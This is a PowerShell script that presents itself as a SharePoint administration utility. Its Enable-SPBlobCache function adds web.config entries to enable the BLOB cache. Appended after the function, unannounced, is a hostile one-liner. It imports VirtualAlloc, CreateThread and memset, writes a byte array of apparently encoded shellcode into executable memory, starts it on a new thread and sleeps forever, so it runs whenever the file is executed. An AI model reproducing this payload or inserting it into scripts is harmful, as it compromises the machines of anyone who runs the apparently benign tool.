

function Enable-SPBlobCache{



    [CmdletBinding()]
    param( 
	
		[Parameter(Mandatory=$true)]
		[String]
		$Identity,
		
		[Parameter(Mandatory=$false)]
		[String]
		$Path = "E:\Blobcache"
	)
	
	
	
	
	if(-not (Get-PSSnapin "Microsoft.SharePoint.PowerShell" -ErrorAction SilentlyContinue)){Add-PSSnapin "Microsoft.SharePoint.PowerShell"}
	
    
    
    
	$SPWebApplication = Get-SPWebApplication -Identity $Identity	
	$SPWebApp = $SPWebApplication.Read()

	
	$configMod1 = New-Object Microsoft.SharePoint.Administration.SPWebConfigModification
	$configMod1.Path = "configuration/SharePoint/BlobCache" 
	$configMod1.Name = "enabled" 
	$configMod1.Sequence = 0
	$configMod1.Owner = "BlobCacheMod" 
	
	
	
	
	$configMod1.Type = 1
	$configMod1.Value = "true" 

	
	$configMod2 = New-Object Microsoft.SharePoint.Administration.SPWebConfigModification
	$configMod2.Path = "configuration/SharePoint/BlobCache" 
	$configMod2.Name = "max-age" 
	$configMod2.Sequence = 0
	$configMod2.Owner = "BlobCacheMod" 

	
	
	
	$configMod2.Type = 1
	$configMod2.Value = "86400" 
	
	
	$configMod3 = New-Object Microsoft.SharePoint.Administration.SPWebConfigModification
	$configMod3.Path = "configuration/SharePoint/BlobCache" 		
	$configMod3.Name = "location"
	$configMod3.Sequence = 0
	$configMod3.Owner = "BlobCacheMod" 
	$configMod3.Type = 1
	$configMod3.Value = $Path
	
	
	$SPWebApp.WebConfigModifications.Add($configMod1)
	$SPWebApp.WebConfigModifications.Add($configMod2)
	$SPWebApp.WebConfigModifications.Add($configMod3)
	$SPWebApp.Update()
	$SPWebApp.Parent.ApplyWebConfigModifications()
} 
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbf,0x5e,0xe4,0xae,0xfc,0xdb,0xc5,0xd9,0x74,0x24,0xf4,0x5a,0x33,0xc9,0xb1,0x47,0x83,0xea,0xfc,0x31,0x7a,0x0f,0x03,0x7a,0x51,0x06,0x5b,0x00,0x85,0x44,0xa4,0xf9,0x55,0x29,0x2c,0x1c,0x64,0x69,0x4a,0x54,0xd6,0x59,0x18,0x38,0xda,0x12,0x4c,0xa9,0x69,0x56,0x59,0xde,0xda,0xdd,0xbf,0xd1,0xdb,0x4e,0x83,0x70,0x5f,0x8d,0xd0,0x52,0x5e,0x5e,0x25,0x92,0xa7,0x83,0xc4,0xc6,0x70,0xcf,0x7b,0xf7,0xf5,0x85,0x47,0x7c,0x45,0x0b,0xc0,0x61,0x1d,0x2a,0xe1,0x37,0x16,0x75,0x21,0xb9,0xfb,0x0d,0x68,0xa1,0x18,0x2b,0x22,0x5a,0xea,0xc7,0xb5,0x8a,0x23,0x27,0x19,0xf3,0x8c,0xda,0x63,0x33,0x2a,0x05,0x16,0x4d,0x49,0xb8,0x21,0x8a,0x30,0x66,0xa7,0x09,0x92,0xed,0x1f,0xf6,0x23,0x21,0xf9,0x7d,0x2f,0x8e,0x8d,0xda,0x33,0x11,0x41,0x51,0x4f,0x9a,0x64,0xb6,0xc6,0xd8,0x42,0x12,0x83,0xbb,0xeb,0x03,0x69,0x6d,0x13,0x53,0xd2,0xd2,0xb1,0x1f,0xfe,0x07,0xc8,0x7d,0x96,0xe4,0xe1,0x7d,0x66,0x63,0x71,0x0d,0x54,0x2c,0x29,0x99,0xd4,0xa5,0xf7,0x5e,0x1b,0x9c,0x40,0xf0,0xe2,0x1f,0xb1,0xd8,0x20,0x4b,0xe1,0x72,0x81,0xf4,0x6a,0x83,0x2e,0x21,0x06,0x86,0xb8,0x7f,0xe5,0x17,0x63,0xe8,0x08,0x28,0x94,0x38,0x85,0xce,0xca,0xe8,0xc6,0x5e,0xaa,0x58,0xa7,0x0e,0x42,0xb3,0x28,0x70,0x72,0xbc,0xe2,0x19,0x18,0x53,0x5b,0x71,0xb4,0xca,0xc6,0x09,0x25,0x12,0xdd,0x77,0x65,0x98,0xd2,0x88,0x2b,0x69,0x9e,0x9a,0xdb,0x99,0xd5,0xc1,0x4d,0xa5,0xc3,0x6c,0x71,0x33,0xe8,0x26,0x26,0xab,0xf2,0x1f,0x00,0x74,0x0c,0x4a,0x1b,0xbd,0x98,0x35,0x73,0xc2,0x4c,0xb6,0x83,0x94,0x06,0xb6,0xeb,0x40,0x73,0xe5,0x0e,0x8f,0xae,0x99,0x83,0x1a,0x51,0xc8,0x70,0x8c,0x39,0xf6,0xaf,0xfa,0xe5,0x09,0x9a,0xfa,0xda,0xdf,0xe2,0x88,0x32,0xdc;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

